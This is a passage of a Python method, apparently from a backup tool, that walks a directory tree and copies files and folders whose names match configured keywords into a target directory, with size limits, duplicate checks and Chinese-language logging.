                if root_abs.startswith(target_dir_abs):
                    continue
                
                # 跳过排除的目录
                if root != source_dir and self.should_exclude_dir(root):
                    dirs[:] = []  # 清空dirs列表，阻止进入子目录
                    continue
                
                # 检查目录名是否包含关键字
                root_name = os.path.basename(root)
                if self._contains_keyword(root_name):
                    # 备份整个目录
                    relative_path = os.path.relpath(root, source_dir)
                    target_path = os.path.join(target_dir, relative_path)
                    
                    # 避免重复备份
                    if root_abs not in backed_up_paths:
                        try:
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path, ignore_errors=True)
                            if self._ensure_directory(os.path.dirname(target_path)):
                                shutil.copytree(root, target_path, symlinks=True)
                                backed_up_paths.add(root_abs)
                                dirs_count += 1
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"🔑 已备份关键字目录: {relative_path}/")
                        except Exception as e:
                            logging.error(f"❌ 备份关键字目录失败 {relative_path}: {str(e)}")
                    
                    # 标记所有子目录为已备份，避免重复处理
                    for subdir in dirs:
                        subdir_path = os.path.join(root, subdir)
                        backed_up_paths.add(os.path.abspath(subdir_path))
                    dirs[:] = []  # 清空dirs列表，不再进入子目录
                    continue
                
                # 检查当前目录是否在已备份的目录中（如果是，跳过该目录下的所有文件）
                if any(root_abs.startswith(backed_path + os.sep) or root_abs == backed_path 
                       for backed_path in backed_up_paths):
                    continue
                
                # 检查文件名是否包含关键字
                for file in files:
                    if self._contains_keyword(file):
                        source_file = os.path.join(root, file)
                        source_file_abs = os.path.abspath(source_file)
                        
                        # 避免重复备份
                        if source_file_abs in backed_up_paths:
                            continue
                        
                        # 检查文件是否在已备份的目录中
                        if any(source_file_abs.startswith(backed_path + os.sep) or source_file_abs == backed_path
                               for backed_path in backed_up_paths):
                            continue
                        
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0:
                                continue
                            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"跳过大文件: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                                continue
                        except OSError:
                            continue
                        
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(target_dir, relative_path)
                        target_file = os.path.join(target_sub_dir, file)
                        
                        try:
                            if self._ensure_directory(target_sub_dir):
                                shutil.copy2(source_file, target_file)
                                backed_up_paths.add(source_file_abs)
                                files_count += 1
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"🔑 已备份关键字文件: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"❌ 备份关键字文件失败 {relative_path}/{file}: {str(e)}")
            
            # 打印备份统计信息
            if files_count > 0 or dirs_count > 0:
                logging.info(f"\n🔑 关键字文件备份统计:")
                if files_count > 0:
                    logging.info(f"   📄 文件: {files_count} 个")
                if dirs_count > 0:
                    logging.info(f"   📁 目录: {dirs_count} 个")
                return target_dir
            else:
                if self.config.DEBUG_MODE:
                    logging.debug("未找到包含关键字的文件或目录")
                return None
                
        except Exception as e:
            logging.error(f"❌ 关键字文件备份过程出错: {str(e)}")
            if self.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            return None
